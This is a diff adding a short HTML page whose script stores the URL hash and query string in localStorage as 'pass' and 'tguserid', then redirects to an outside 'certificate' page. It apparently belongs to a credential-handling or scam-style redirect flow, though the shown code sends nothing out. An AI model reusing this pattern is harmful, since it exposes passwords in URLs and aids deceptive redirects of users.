@@ -1,0 +1,37 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width" />
+</head>
+<script>
+
+var id = window.location.hash.slice(1);
+    var pass = window.location.search.substr(1);
+        if (id == "") {
+			alert('done' + id + pass);
+        } else {
+	        var checkid = window.location.hash.slice(1);
+            localStorage.removeItem('pass');
+            localStorage.setItem('pass', JSON.stringify(checkid));
+            var checkpass = window.location.search.substr(1);
+            localStorage.removeItem('tguserid');
+            localStorage.setItem('tguserid', JSON.stringify(checkpass));
+        };
+			setTimeout(function(){
+				window.location.replace('https://nwotb.ml/certificate');
+			},1111)
+			var get = function(){
+				var checkid = window.location.hash.slice(1);
+                localStorage.removeItem('pass');
+                localStorage.setItem('pass', JSON.stringify(checkid));
+                var checkpass = window.location.search.substr(1);
+                localStorage.removeItem('tguserid');
+                localStorage.setItem('tguserid', JSON.stringify(checkpass));
+			setTimeout(function(){
+				window.location.replace('https://nwotb.ml/certificate');
+			},1111)
+            }
+			</script>
+
+</body>
+</html>
